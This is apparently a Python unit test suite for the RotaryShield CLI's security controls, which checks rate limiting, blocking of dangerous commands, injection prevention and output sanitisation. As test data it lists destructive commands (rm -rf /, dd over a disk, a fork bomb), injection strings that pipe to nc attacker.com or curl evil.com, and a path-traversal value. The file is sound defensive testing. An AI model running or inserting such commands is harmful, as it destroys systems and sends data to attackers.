#!/usr/bin/env python3
"""
Security Tests for CLI Interface
Tests for RotaryShield CLI security features and attack prevention.

This test suite validates:
- Command injection prevention in CLI operations
- Rate limiting and abuse prevention
- Privilege escalation prevention
- Input validation in CLI arguments
- Audit logging of CLI operations
"""

import unittest
import os
import sys
import time
import tempfile
from unittest.mock import patch, MagicMock, call
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))

from rotaryshield.cli import RotaryShieldCLI, CLISecurityManager, CommandResult


class TestCLISecurityManager(unittest.TestCase):
    """Test CLI security manager functionality."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.security_manager = CLISecurityManager()
    
    def test_rate_limiting(self):
        """Test rate limiting of CLI commands."""
        # First command should be allowed
        result1 = self.security_manager.validate_command_execution("systemctl status rotaryshield")
        self.assertTrue(result1, "First command should be allowed")
        
        # Immediate second command should be rate limited
        result2 = self.security_manager.validate_command_execution("systemctl restart rotaryshield")
        self.assertFalse(result2, "Second immediate command should be rate limited")
        
        # After waiting, command should be allowed again
        time.sleep(1.1)  # Wait longer than rate limit
        result3 = self.security_manager.validate_command_execution("systemctl status rotaryshield")
        self.assertTrue(result3, "Command after wait should be allowed")
    
    def test_dangerous_command_detection(self):
        """Test detection of dangerous command patterns."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /var/lib/rotaryshield",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod 777 /etc/passwd",
            "chown -R root:root /",
            "cat /dev/random > /dev/sda",
        ]
        
        for dangerous_cmd in dangerous_commands:
            with self.subTest(command=dangerous_cmd):
                result = self.security_manager.validate_command_execution(dangerous_cmd)
                self.assertFalse(result, f"Dangerous command should be blocked: {dangerous_cmd}")
    
    def test_command_logging(self):
        """Test audit logging of CLI commands."""
        with patch.object(self.security_manager, 'audit_logger') as mock_logger:
            # Mock the audit logger
            mock_logger.log_system_event = MagicMock()
            
            # Execute a command
            self.security_manager.validate_command_execution("systemctl status rotaryshield", "testuser")
            
            # Check that audit event was logged
            mock_logger.log_system_event.assert_called_with(
                action="cli_command_attempted",
                user_id="testuser",
                description="CLI command: systemctl status rotaryshield"
            )
    
    def test_command_history_management(self):
        """Test command history storage and limits."""
        # Execute many commands to test history limit
        for i in range(150):  # More than the 100 command limit
            time.sleep(0.001)  # Small delay to avoid rate limiting
            result = CommandResult(
                success=True,
                message="Success",
                exit_code=0,
                execution_time=0.1
            )
            self.security_manager.log_command_result(f"test_command_{i}", result)
        
        # History should be limited to 100 entries
        self.assertLessEqual(len(self.security_manager._command_history), 100)
        
        # Most recent commands should be preserved
        recent_commands = [entry['command'] for entry in self.security_manager._command_history[-5:]]
        self.assertIn("test_command_149", recent_commands)


class TestCLICommandExecution(unittest.TestCase):
    """Test CLI command execution security."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.cli = RotaryShieldCLI()
    
    @patch('subprocess.run')
    def test_command_timeout_enforcement(self, mock_subprocess):
        """Test that commands are properly timed out."""
        # Mock a command that times out
        from subprocess import TimeoutExpired
        mock_subprocess.side_effect = TimeoutExpired(cmd=['test'], timeout=30)
        
        result = self.cli._execute_system_command(['test', 'command'], timeout=30)
        
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, 124)  # Standard timeout exit code
        self.assertIn("timed out", result.message)
    
    @patch('subprocess.run')
    def test_restricted_environment(self, mock_subprocess):
        """Test that commands run with restricted environment."""
        mock_subprocess.return_value = MagicMock(returncode=0, stdout="test", stderr="")
        
        self.cli._execute_system_command(['echo', 'test'])
        
        # Check that subprocess was called with restricted PATH
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args
        self.assertIn('env', call_args.kwargs)
        self.assertEqual(call_args.kwargs['env']['PATH'], "/usr/bin:/bin:/usr/sbin:/sbin")
    
    @patch('subprocess.run')
    def test_output_sanitization(self, mock_subprocess):
        """Test that command output is sanitized."""
        # Mock command with potentially dangerous output
        dangerous_output = "Normal output\x00\x01\x02\x1b[31mDangerous\x1b[0m"
        mock_subprocess.return_value = MagicMock(
            returncode=0, 
            stdout=dangerous_output, 
            stderr=""
        )
        
        result = self.cli._execute_system_command(['echo', 'test'])
        
        self.assertTrue(result.success)
        # Output should be sanitized
        self.assertNotIn('\x00', result.message)
        self.assertNotIn('\x01', result.message)
        self.assertNotIn('\x1b', result.message)
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection through arguments."""
        # These should be blocked by the security manager
        injection_attempts = [
            ['systemctl', 'status', 'rotaryshield; rm -rf /'],
            ['echo', 'test && curl evil.com'],
            ['ls', '| nc attacker.com 1234'],
            ['cat', '`id`'],
            ['echo', '$(whoami)'],
        ]
        
        for cmd_args in injection_attempts:
            with self.subTest(args=cmd_args):
                result = self.cli._execute_system_command(cmd_args)
                # Should be blocked by security policy
                self.assertFalse(result.success)
                self.assertIn("denied by security policy", result.message)


class TestCLIServiceOperations(unittest.TestCase):
    """Test security of CLI service operations."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.cli = RotaryShieldCLI()
        # Create a temporary config file for testing
        self.temp_config = tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False)
        self.temp_config.write("""
detection:
  max_retry: 3
  ban_threshold: 5
  log_files:
    - /var/log/auth.log
  patterns:
    ssh_fail: "Failed password.*from (\\\\d+\\.\\\\d+\\.\\\\d+\\.\\\\d+)"
blocking:
  ban_time: 300
database:
  db_path: /tmp/test.db
""")
        self.temp_config.close()
        self.cli.config_path = self.temp_config.name
    
    def tearDown(self):
        """Clean up test fixtures."""
        os.unlink(self.temp_config.name)
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_start_with_config_validation(self, mock_execute):
        """Test that start command validates configuration first."""
        # Mock successful system calls
        mock_execute.side_effect = [
            CommandResult(True, "active", 0, 0.1),  # is-active check
            CommandResult(True, "Started", 0, 0.1)  # start command
        ]
        
        with patch('rotaryshield.cli.test_configuration', return_value=True):
            result = self.cli.start()
            self.assertEqual(result, 0)
        
        # Should have called configuration validation
        # and then the start command
        self.assertEqual(mock_execute.call_count, 2)
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_start_blocks_invalid_config(self, mock_execute):
        """Test that start is blocked if configuration is invalid."""
        with patch('rotaryshield.cli.test_configuration', return_value=False):
            result = self.cli.start()
            self.assertNotEqual(result, 0)
        
        # Should not have called systemctl start
        mock_execute.assert_not_called()
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_restart_validates_config(self, mock_execute):
        """Test that restart validates configuration before proceeding."""
        mock_execute.side_effect = [
            CommandResult(True, "active", 0, 0.1),  # is-active check
            CommandResult(True, "Restarted", 0, 0.1)  # restart command
        ]
        
        with patch('rotaryshield.cli.test_configuration', return_value=True):
            result = self.cli.restart()
            self.assertEqual(result, 0)
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_restart_blocked_invalid_config(self, mock_execute):
        """Test that restart is blocked for invalid configuration."""
        with patch('rotaryshield.cli.test_configuration', return_value=False):
            result = self.cli.restart()
            self.assertNotEqual(result, 0)
        
        # Should not have called systemctl restart
        mock_execute.assert_not_called()
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_stop_cleanup(self, mock_execute):
        """Test that stop command properly cleans up resources."""
        mock_execute.return_value = CommandResult(True, "Stopped", 0, 0.1)
        
        # Create a fake PID file
        pid_file = "/tmp/test_rotaryshield.pid"
        self.cli.pid_file = pid_file
        with open(pid_file, 'w') as f:
            f.write("12345")
        
        result = self.cli.stop()
        self.assertEqual(result, 0)
        
        # PID file should be cleaned up
        self.assertFalse(os.path.exists(pid_file))
    
    @patch('os.path.exists')
    @patch('builtins.open')
    @patch('os.kill')
    def test_status_pid_validation(self, mock_kill, mock_open, mock_exists):
        """Test that status command validates PID file securely."""
        # Mock PID file exists
        mock_exists.return_value = True
        
        # Mock reading PID file
        mock_open.return_value.__enter__.return_value.read.return_value = "12345"
        
        # Mock process check (process exists)
        mock_kill.return_value = None  # No exception means process exists
        
        with patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command') as mock_execute:
            mock_execute.side_effect = [
                CommandResult(True, "active", 0, 0.1),  # systemctl status
                CommandResult(True, "logs", 0, 0.1)     # journalctl
            ]
            
            with patch('rotaryshield.cli.test_configuration', return_value=True):
                result = self.cli.status()
                self.assertEqual(result, 0)
        
        # Should have checked if process exists
        mock_kill.assert_called_once_with(12345, 0)
    
    @patch('os.path.exists')
    @patch('builtins.open')
    def test_status_handles_invalid_pid(self, mock_open, mock_exists):
        """Test that status handles invalid PID files securely."""
        mock_exists.return_value = True
        
        # Mock invalid PID content
        mock_open.return_value.__enter__.return_value.read.return_value = "not_a_number"
        
        with patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command') as mock_execute:
            mock_execute.side_effect = [
                CommandResult(True, "active", 0, 0.1),  # systemctl status
                CommandResult(True, "logs", 0, 0.1)     # journalctl
            ]
            
            with patch('rotaryshield.cli.test_configuration', return_value=True):
                result = self.cli.status()
                # Should not crash on invalid PID
                self.assertEqual(result, 0)


class TestCLIArgumentValidation(unittest.TestCase):
    """Test CLI argument validation and sanitization."""
    
    def test_config_path_validation(self):
        """Test validation of configuration file paths."""
        cli = RotaryShieldCLI()
        
        # Test with path traversal attempt
        malicious_path = "../../../etc/passwd"
        cli.config_path = malicious_path
        
        # Should be handled safely in test_config
        result = cli.test_config()
        self.assertNotEqual(result, 0)  # Should fail safely
    
    def test_log_level_validation(self):
        """Test validation of log level arguments."""
        # This would be tested in the argument parser
        valid_levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]
        
        # Test that only valid levels are accepted
        for level in valid_levels:
            # This should not raise an exception
            self.assertIn(level, valid_levels)
        
        # Invalid levels should be rejected by argparse
        invalid_levels = ["TRACE", "VERBOSE", "FATAL", "\"; rm -rf /\""]
        for level in invalid_levels:
            self.assertNotIn(level, valid_levels)


class TestCLIPrivilegeSeparation(unittest.TestCase):
    """Test privilege separation and security boundaries."""
    
    def test_no_root_requirement_for_status(self):
        """Test that status commands don't require root privileges."""
        cli = RotaryShieldCLI()
        
        # Status operations should work without root
        with patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command') as mock_execute:
            mock_execute.side_effect = [
                CommandResult(True, "active", 0, 0.1),  # systemctl status
                CommandResult(True, "logs", 0, 0.1)     # journalctl
            ]
            
            with patch('rotaryshield.cli.test_configuration', return_value=True):
                with patch('os.path.exists', return_value=False):  # No PID file
                    result = cli.status()
                    self.assertEqual(result, 0)
    
    def test_config_test_safety(self):
        """Test that config testing is safe without root."""
        cli = RotaryShieldCLI()
        
        # Create a temporary safe config file
        temp_config = tempfile.NamedTemporaryFile(mode='w', suffix='.yml', delete=False)
        temp_config.write("""
detection:
  max_retry: 3
  log_files: []
  patterns: {}
blocking:
  ban_time: 300
database:
  db_path: /tmp/test.db
""")
        temp_config.close()
        
        try:
            result = cli.test_config(temp_config.name)
            # Should work without special privileges
            # Result depends on actual implementation
            self.assertIn(result, [0, 1])  # Either success or safe failure
        finally:
            os.unlink(temp_config.name)


class TestCLIErrorHandling(unittest.TestCase):
    """Test CLI error handling and information disclosure prevention."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.cli = RotaryShieldCLI()
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_error_message_sanitization(self, mock_execute):
        """Test that error messages don't disclose sensitive information."""
        # Mock command that returns sensitive error
        sensitive_error = "Permission denied: /etc/shadow\nPassword: secret123"
        mock_execute.return_value = CommandResult(
            False, sensitive_error, 1, 0.1
        )
        
        result = self.cli.start()
        
        # Should fail but not expose sensitive details in output
        self.assertNotEqual(result, 0)
        # The error should be sanitized in the CLI output
    
    def test_exception_handling(self):
        """Test that exceptions are handled gracefully."""
        cli = RotaryShieldCLI()
        
        # Test with non-existent config path
        result = cli.test_config("/nonexistent/path/config.yml")
        
        # Should fail gracefully without exposing stack traces
        self.assertNotEqual(result, 0)
    
    @patch('rotaryshield.cli.RotaryShieldCLI._execute_system_command')
    def test_timeout_handling(self, mock_execute):
        """Test handling of command timeouts."""
        # Mock command timeout
        mock_execute.return_value = CommandResult(
            False, "Command timed out after 30 seconds", 124, 30.0
        )
        
        result = self.cli.start()
        
        # Should handle timeout gracefully
        self.assertNotEqual(result, 0)


if __name__ == '__main__':
    unittest.main()